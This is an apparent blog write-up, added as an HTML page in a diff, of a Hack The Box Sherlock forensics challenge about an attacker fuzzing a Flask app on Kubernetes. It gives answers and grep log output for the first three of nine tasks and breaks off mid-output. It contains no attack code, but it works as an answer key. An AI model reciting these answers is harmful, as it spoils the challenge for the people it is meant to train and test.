@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="desktop" > 
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-84TPQBH5EH');
+</script>
+<!-- End Google Analytics -->
+
+  
+  
+
+  
+  <title>【Sherlocks】Cookie-Consumption | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+
+  <meta name="description" content="OPTinselTrace24-2: Cookie ConsumptionSherlock Scenario Santa’s North Pole Operations have implemented the “Cookie Consumption Scheduler” (CCS), a crucial service running on a Kubernetes cluster. This">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Sherlocks】Cookie-Consumption">
+<meta property="og:url" content="http://example.com/2024/12/19/Sherlocks-Cookie-Consumption/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="OPTinselTrace24-2: Cookie ConsumptionSherlock Scenario Santa’s North Pole Operations have implemented the “Cookie Consumption Scheduler” (CCS), a crucial service running on a Kubernetes cluster. This">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/wpimages/2024/Sherlocks/Cookie-Consumption/background.jpg">
+<meta property="article:published_time" content="2024-12-19T05:06:25.000Z">
+<meta property="article:modified_time" content="2024-12-19T07:20:23.558Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="k8s">
+<meta property="article:tag" content="sherlocks">
+<meta property="article:tag" content="pod">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/wpimages/2024/Sherlocks/Cookie-Consumption/background.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/images/backgroup.jpg" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="  ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>Hexo </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
+      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
+      </a>
+    
+    <div id="nav-menu-btn" class="nav-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=/images/avatar.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">Flower </div>
+      <div class="dot"></div>
+      <div class="subtitle">Hi Im Flower </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+    
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Tags</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
+    </div>
+  </div>
+
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/cloud/">
+                cloud
+                <div class="category-count">7</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-5/">
+                htb-Season-5
+                <div class="category-count">7</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-6/">
+                htb-Season-6
+                <div class="category-count">10</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-4/">
+                htb-Season-4
+                <div class="category-count">3</div>
+            </a>
+        
+            <a class="category-link" href="/categories/ctf/">
+                ctf
+                <div class="category-count">7</div>
+            </a>
+        
+            <a class="category-link" href="/categories/Sherlocks/">
+                Sherlocks
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/AD/">
+                AD
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/CVE/">
+                CVE
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/forensic/">
+                forensic
+                <div class="category-count">2</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/2024/12/20/Sherlocks-Blizzard-Breakdown/" title="【Sherlocks】Blizzard-Breakdown" >
+            <div class="recent-link-text">
+              【Sherlocks】Blizzard-Breakdown
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/12/19/Sherlocks-Cookie-Consumption/" title="【Sherlocks】Cookie-Consumption" >
+            <div class="recent-link-text">
+              【Sherlocks】Cookie-Consumption
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/12/17/box-wp-Heal/" title="【season-6】 htb Heal wp" >
+            <div class="recent-link-text">
+              【season-6】 htb Heal wp
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/12/14/box-wp-Unrested/" title="【CVE machines】 htb Unrested wp" >
+            <div class="recent-link-text">
+              【CVE machines】 htb Unrested wp
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/12/12/Tracks-AD-Rebound/" title="Tracks-AD-Rebound" >
+            <div class="recent-link-text">
+              Tracks-AD-Rebound
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+
+<article id="post-Sherlocks-Cookie-Consumption" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+<div class="article-gallery">
+  <div class="article-gallery-photos">
+    
+      <a class="article-gallery-img" rel="gallery_cm4uzgu8p00009ckygjpbazkq">
+        <img src="/wpimages/2024/Sherlocks/Cookie-Consumption/background.jpg" itemprop="image">
+      </a>
+    
+  </div>
+</div>
+
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        【Sherlocks】Cookie-Consumption
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2024-12-19T05:06:25.000Z" itemprop="datePublished">2024-12-19</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+  <a class="meta-cate-link" href="/categories/forensic/">forensic</a>
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            7.9k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <h1 id="OPTinselTrace24-2-Cookie-Consumption"><a href="#OPTinselTrace24-2-Cookie-Consumption" class="headerlink" title="OPTinselTrace24-2: Cookie Consumption"></a>OPTinselTrace24-2: Cookie Consumption</h1><h2 id="Sherlock-Scenario"><a href="#Sherlock-Scenario" class="headerlink" title="Sherlock Scenario"></a>Sherlock Scenario</h2><blockquote>
+<p>Santa’s North Pole Operations have implemented the “Cookie Consumption Scheduler” (CCS), a crucial service running on a Kubernetes cluster. This service ensures Santa’s cookie and milk intake is balanced during his worldwide deliveries, optimizing his energy levels and health.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">Task 1</span><br><span class="line"></span><br><span class="line">How many replicas are configured for the flask-app deployment?</span><br><span class="line"></span><br><span class="line">Integer, e.g - 65</span><br><span class="line"></span><br><span class="line">Task 2</span><br><span class="line"></span><br><span class="line">What is the NodePort through which the flask-app is exposed?</span><br><span class="line"></span><br><span class="line">*****/TCP</span><br><span class="line"></span><br><span class="line">Task 3</span><br><span class="line"></span><br><span class="line">What time (UTC) did the attacker first initiate fuzzing on the /system/ endpoint?</span><br><span class="line"></span><br><span class="line">YYYY-MM-DD hh:mm:ss</span><br><span class="line"></span><br><span class="line">Task 4</span><br><span class="line"></span><br><span class="line">Which endpoint did the attacker discover through fuzzing and subsequently exploit?</span><br><span class="line"></span><br><span class="line">/system/*******</span><br><span class="line"></span><br><span class="line">Task 5</span><br><span class="line"></span><br><span class="line">Which program did the attacker attempt to install to access their HTTP pages?</span><br><span class="line"></span><br><span class="line">****</span><br><span class="line"></span><br><span class="line">Task 6</span><br><span class="line"></span><br><span class="line">What is the IP address of the attacker?</span><br><span class="line"></span><br><span class="line">**.***.***.***</span><br><span class="line"></span><br><span class="line">Task 7</span><br><span class="line"></span><br><span class="line">What is the name of the pod that was compromised and used by the attacker as the initial foothold?</span><br><span class="line"></span><br><span class="line">flask-app-**********-*****</span><br><span class="line"></span><br><span class="line">Task 8</span><br><span class="line"></span><br><span class="line">What is the name of the malicious pod created by the attacker?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Task 9</span><br><span class="line"></span><br><span class="line">What is the absolute path of the backdoor file left behind by the attacker?</span><br></pre></td></tr></table></figure>
+
+<h2 id="task-1"><a href="#task-1" class="headerlink" title="task 1"></a>task 1</h2><h3 id="How-many-replicas-are-configured-for-the-flask-app-deployment"><a href="#How-many-replicas-are-configured-for-the-flask-app-deployment" class="headerlink" title="How many replicas are configured for the flask-app deployment?"></a>How many replicas are configured for the flask-app deployment?</h3><blockquote>
+<p>3</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ grep &#x27;replicas &#x27; ./* -r</span><br><span class="line">./default/describes/deployments.log:NewReplicaSet:   flask-app-77fbdcfcff (3/3 replicas created)</span><br><span class="line">./kube-system/describes/deployments.log:NewReplicaSet:   coredns-7b98449c4 (1/1 replicas created)</span><br><span class="line">./kube-system/describes/deployments.log:NewReplicaSet:   local-path-provisioner-595dcfc56f (1/1 replicas created)</span><br><span class="line">./kube-system/describes/deployments.log:NewReplicaSet:   metrics-server-cdcc87586 (1/1 replicas created)</span><br><span class="line">./kube-system/describes/deployments.log:NewReplicaSet:   traefik-d7c9c5778 (1/1 replicas created)</span><br></pre></td></tr></table></figure>
+
+<h2 id="task-2"><a href="#task-2" class="headerlink" title="task 2"></a>task 2</h2><h3 id="What-is-the-NodePort-through-which-the-flask-app-is-exposed"><a href="#What-is-the-NodePort-through-which-the-flask-app-is-exposed" class="headerlink" title="What is the NodePort through which the flask-app is exposed?"></a>What is the NodePort through which the flask-app is exposed?</h3><blockquote>
+<p>30000&#x2F;TCP</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">└─$ head -30 ./default/describes/services.log</span><br><span class="line">Name:                     flask-app-service</span><br><span class="line">Namespace:                default</span><br><span class="line">Labels:                   &lt;none&gt;</span><br><span class="line">Annotations:              &lt;none&gt;</span><br><span class="line">Selector:                 app=flask-app</span><br><span class="line">Type:                     NodePort</span><br><span class="line">IP Family Policy:         SingleStack</span><br><span class="line">IP Families:              IPv4</span><br><span class="line">IP:                       10.43.58.30</span><br><span class="line">IPs:                      10.43.58.30</span><br><span class="line">Port:                     &lt;unset&gt;  5000/TCP</span><br><span class="line">TargetPort:               5000/TCP</span><br><span class="line">NodePort:                 &lt;unset&gt;  30000/TCP</span><br><span class="line">Endpoints:                10.42.0.14:5000,10.42.0.16:5000,10.42.0.17:5000</span><br><span class="line">Session Affinity:         None</span><br><span class="line">External Traffic Policy:  Cluster</span><br><span class="line">Events:                   &lt;none&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="task-3"><a href="#task-3" class="headerlink" title="task 3"></a>task 3</h2><h3 id="What-time-UTC-did-the-attacker-first-initiate-fuzzing-on-the-system-endpoint"><a href="#What-time-UTC-did-the-attacker-first-initiate-fuzzing-on-the-system-endpoint" class="headerlink" title="What time (UTC) did the attacker first initiate fuzzing on the &#x2F;system&#x2F; endpoint?"></a>What time (UTC) did the attacker first initiate fuzzing on the &#x2F;system&#x2F; endpoint?</h3><blockquote>
+<p>2024-11-08 22:02:48</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ grep -a -i &#x27;/system/&#x27; ./* -r|sort -u|head -30</span><br><span class="line">./default/flask-app-77fbdcfcff-2tqgw/flask-app.log:10.42.0.1 - - [08/Nov/2024 22:01:37] &quot;GET /system/status?service=ssh HTTP/1.1&quot; 500 -</span><br><span class="line">./default/flask-app-77fbdcfcff-2tqgw/flask-app.log:10.42.0.1 - - [08/Nov/2024 22:02:38] &quot;GET /system/logs?service=system HTTP/1.1&quot; 500 -</span><br><span class="line">./default/flask-app-77fbdcfcff-2tqgw/flask-app.log:10.42.0.1 - - [08/Nov/2024 22:02:48] &quot;GET /system/ls HTTP/1.1&quot; 404 -</span><br><span class="line">./default/flask-app-77fbdcfcff-2tqgw/flask-app.log:10.42.0.1 - - [08/Nov/2024 22:02:56] &quot;GET /system/admin HTTP/1.1&quot; 404 -</span><br><span 